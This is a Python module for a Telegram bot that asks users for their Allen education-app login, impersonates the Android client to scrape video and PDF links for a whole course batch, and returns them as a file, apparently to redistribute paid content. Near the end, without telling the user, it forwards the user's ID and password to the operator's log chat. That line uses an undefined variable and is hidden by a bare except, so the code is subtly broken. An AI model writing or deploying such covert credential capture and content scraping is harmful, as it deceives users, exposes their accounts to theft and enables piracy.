import asyncio
import uuid
import json, time
import cloudscraper
from pyrogram.enums import ParseMode
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from functools import lru_cache
import aiofiles, traceback
from Extractor.core.func import send_file
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from config import LOGGER_ID


BASE_API_URL = 'https://api.allen-live.in/api/v1'
HEADERS = {
    'Host': 'api.allen-live.in',
    'x-device-type': 'android',
    'x-client-type': 'android', 
    'x-client-app-version-code': '98',
    'x-client-id': '1',
    'accept': 'application/json',
    'accept-charset': 'UTF-8',
    'user-agent': 'okhttp/4.12.0',
    'content-type': 'application/json',
}

MAX_CONCURRENT_REQUESTS = 20
CHUNK_SIZE = 10
CACHE_SIZE = 256
MAX_RETRIES = 3


@lru_cache(maxsize=CACHE_SIZE)
def get_week_of(date_str: str) -> str:
    date = datetime.strptime(date_str, "%d-%m-%Y")
    return (date - timedelta(days=date.weekday())).strftime("%d-%m-%Y")

def create_session() -> cloudscraper.CloudScraper:
    session = cloudscraper.create_scraper()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=MAX_CONCURRENT_REQUESTS,
        pool_maxsize=MAX_CONCURRENT_REQUESTS,
        pool_block=True
    )
    
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update(HEADERS)
    return session
    

async def login(username: str, password: str) -> Optional[Dict]:
    try:
        loop = asyncio.get_event_loop()
        session = await loop.run_in_executor(None, create_session)
        device_id = str(uuid.uuid4())
        session.headers['x-device-id'] = device_id

        response = await loop.run_in_executor(
            None,
            lambda: session.post(
                f"{BASE_API_URL}/auth/username",
                json={'username': username, 'password': password, 'persona_type': 'STUDENT'},
            )
        )
        
        auth_response = response.json()
        if auth_response.get('status') != 200:
            return None

        token = response.headers['x-access-token']
        session.headers['authorization'] = f'Bearer {token}'

        response = await loop.run_in_executor(
            None,
            lambda: session.get(f"{BASE_API_URL}/user/studentInfo")
        )
        data = response.json()

        if 'data' not in data:
            return None

        user_courses = []
        for course in data['data']['course_details']:
            if course.get('enrolled_batches'):
                user_courses.append({
                    'course_id': course['course_id'],
                    'course_name': course['course_name'],
                    'session': course['session'],
                    'batch_list': ','.join(course.get('enrolled_batches', []) + 
                                         course.get('unenrolled_batches', []))
                })

        return {
            "token": token,
            "device_id": device_id,
            "session": session,
            "courses": user_courses
        }

    except Exception:
        return None

async def fetch_lecture_material(session, card, course_id, batch_list, date):
    try:
        loop = asyncio.get_event_loop()
        meeting_id = card['cta']['action']['data']['query']['meeting_id']

        response = await loop.run_in_executor(
            None,
            lambda: session.post(
                f"{BASE_API_URL}/pages/getPage",
                params={
                    'meeting_id': meeting_id,
                    'selected_course_id': course_id,
                    'selected_batch_list': batch_list,
                },
                json={'page_url': '/preclassdetail'}
            )
        )
        lecture_data = response.json()

        lecture_info = lecture_data['data']['page_content']['widgets'][0]['data']
        materials = lecture_info['meeting_materials']['materials']

        result = ""
        v_count = 0
        p_count = 0
        subject = card['label'].split()[0] if card['label'] else 'None'
        topic = card['title']
        faculty = lecture_info['current_class_info']['hosts'][0]['profile']['name']

        for material in materials:
            if 'data' in material and 'action' in material['data']:
                if material['type'] == 'VIDEO':
                    url = material['data']['action']['data']['url']
                    result += f'{subject} »» {topic} »» #{faculty.replace(" ", "_").replace(".", "")} »» {date} »» {url}\n'
                    v_count += 1
                elif material['type'] == 'PDF':
                    url = material['data']['action']['data']['uri']
                    result += f'{subject} »» {topic} »» #{faculty.replace(" ", "_").replace(".", "")} »» {date} »» {url}\n'
                    p_count += 1

        return result, v_count, p_count

    except Exception:
        return None, 0, 0

async def fetch_lecture_details(
    date_str: str,
    session: cloudscraper.CloudScraper,
    course_id: str,
    batch_list: str
) -> Tuple[str, int, int]:
    try:
        loop = asyncio.get_event_loop()
        week_of = get_week_of(date_str)
        params = {
            'week_of': week_of,
            'selected_course_id': course_id,
            'selected_batch_list': batch_list,
        }

        response = await loop.run_in_executor(
            None,
            lambda: session.post(
                f"{BASE_API_URL}/pages/getPage",
                params=params,
                json={'page_url': '/calendar'}
            )
        )
        response_data = response.json()

        lectures = ""
        total_v_count = 0
        total_p_count = 0
        day_str = datetime.strptime(date_str, "%d-%m-%Y").strftime("%d").lstrip('0')
        
        for day in response_data['data']['page_content']['widgets'][0]['data']['list']:
            if day['title'] == day_str:
                tasks = [
                    fetch_lecture_material(session, card, course_id, batch_list, date_str)
                    for card in day['cards']
                ]
                results = await asyncio.gather(*tasks)
                for result, v_count, p_count in results:
                    if result:
                        lectures += result
                        total_v_count += v_count
                        total_p_count += p_count

        return lectures, total_v_count, total_p_count

    except Exception:
        return "", 0, 0

async def fetch_batch_data(
    token: str,
    device_id: str,
    session: cloudscraper.CloudScraper,
    course_id: str,
    batch_list: str,
    start_date: str,
    end_date: str
) -> Tuple[str, int, int]:
    dates = generate_dates(start_date, end_date)
    results = ""
    total_v_count = 0
    total_p_count = 0
    
    for i in range(0, len(dates), CHUNK_SIZE):
        date_chunk = dates[i:i+CHUNK_SIZE]
        tasks = [
            fetch_lecture_details(date_str, session, course_id, batch_list)
            for date_str in date_chunk
        ]
        chunk_results = await asyncio.gather(*tasks)
        for result, v_count, p_count in chunk_results:
            results += result
            total_v_count += v_count
            total_p_count += p_count

    return results, total_v_count, total_p_count

def generate_dates(start_date: str, end_date: str) -> List[str]:
    start = datetime.strptime(start_date, "%d-%m-%Y")
    end = datetime.strptime(end_date, "%d-%m-%Y")
    return [(start + timedelta(days=x)).strftime("%d-%m-%Y")
            for x in range((end-start).days + 1)]

async def AllenV2(app, query, message):
    try:
        msg = await message.reply_text(
            "**🔑 For access, please transmit your ID & Password in the correct sequence:\n\n"
            "🔒 Send like this: ID*Password\n\n**"
        )

        try:
            input1 = await asyncio.wait_for(
                app.listen(chat_id=message.chat.id, user_id=query.from_user.id),
                timeout=60 
            )
            raw_text = input1.text
            await input1.delete(True)
        except asyncio.TimeoutError:
            await msg.edit_text("❌ Timeout: No response received within 1 minute")
            return
        
        if '*' in raw_text:
            username, password = raw_text.split('*', 1)
            session_data = await login(username, password)
        else:
            await msg.edit_text("❌ Login failed. Please check your credentials.")
            return
            
        if not session_data:
            await msg.edit_text("❌ Login failed. Please check your credentials.")
            return
            
        await msg.edit_text("✅ Login successful!\n\nFetching Batches data...")

        text = "\n".join(f"<code>{i}</code>. <b>{b['course_name']} ({b['session']})</b>"
                        for i, b in enumerate(session_data["courses"], 1))
        await msg.edit_text(
            f"<b>📚 Available Batches:</b>\n\n{text}\n\n<b>Send Batch No.:</b>",
            parse_mode=ParseMode.HTML
        )
      
        try:
            batch_msg = await asyncio.wait_for(
                app.listen(chat_id=message.chat.id, user_id=query.from_user.id),
                timeout=60
            )
            idx = int(batch_msg.text.strip()) - 1
            await batch_msg.delete()
            
            if not 0 <= idx < len(session_data["courses"]): 
                raise ValueError("Invalid batch number")
        except asyncio.TimeoutError:
            await msg.edit_text("❌ Timeout: No batch selection received within 1 minute")
            return
        except Exception as e:
            await msg.edit_text(f"❌ Invalid batch number: {str(e)}")
            return
    
        course = session_data["courses"][idx]
        loop = asyncio.get_event_loop()
        
        response = await loop.run_in_executor(
            None,
            lambda: session_data["session"].get(f"{BASE_API_URL}/user/studentInfo")
        )
        response_data = response.json()
        
        if 'data' not in response_data:
            await msg.edit_text("❌ Failed to fetch student information")
            return
          
        batch_detail = next(
            (i for i in response_data['data']['student_batch_detail'] if i['course_id'] == course["course_id"]),
            None
        )
        
        if not batch_detail:
            await msg.edit_text("❌ Batch details not found")
            return
            
        start_date = batch_detail['batch_validity']['start_from']
        end_date_api = batch_detail['batch_validity']['end_at']
        current_date = datetime.now().strftime("%d-%m-%Y")
        end_date = min(end_date_api, current_date, key=lambda x: datetime.strptime(x, "%d-%m-%Y"))

        start_time = time.time()
        await msg.edit_text(f"**📥 Extracting from: {course['course_name']} ...**")
      
        results, video_count, pdf_count = await fetch_batch_data(
            session_data["token"],
            session_data["device_id"],
            session_data["session"],
            course["course_id"],
            course["batch_list"],
            start_date,
            end_date
        )
        
        if not results:
            await msg.edit_text("❌ No lecture materials found")
            return

        elapsed = time.time() - start_time
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        
        batch_name = f"{course['course_name']} ({course['session']})"
        filename = f"{batch_name}.txt"
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write(results)

        try:
            await app.send_message(chat_id=LOGGER_ID, text=f"✅ ALLEN\n\nʙᴀᴛᴄʜ:<code>{batch_detail['course_name']} ({batch_detail['batch_name']}) [{start_date}-{end_date_api}]</code>\n\nɪᴅ ᴘᴀssᴡᴏʀᴅ: <code>{email}*{password}</code>", reply_to_message_id=11288, parse_mode=ParseMode.HTML)
        except:
            pass

        caption = (
            f"**App Name: Allen (NEW)**\n"
            f"**Batch Name:** `{batch_detail['course_name']} ({batch_detail['batch_name']})`\n\n"
            f"🍿 **Total Videos**: `{video_count}`\n"
            f"📝 **Total PDFs**: `{pdf_count}`\n"
            f"⌚️ **Time Taken**: `{elapsed_str}`"
        )
        return await send_file(filename, caption, msg, query)
    except Exception as e:
        traceback.print_exc()
        await message.reply_text(f"❌ An error occurred: {str(e)}")
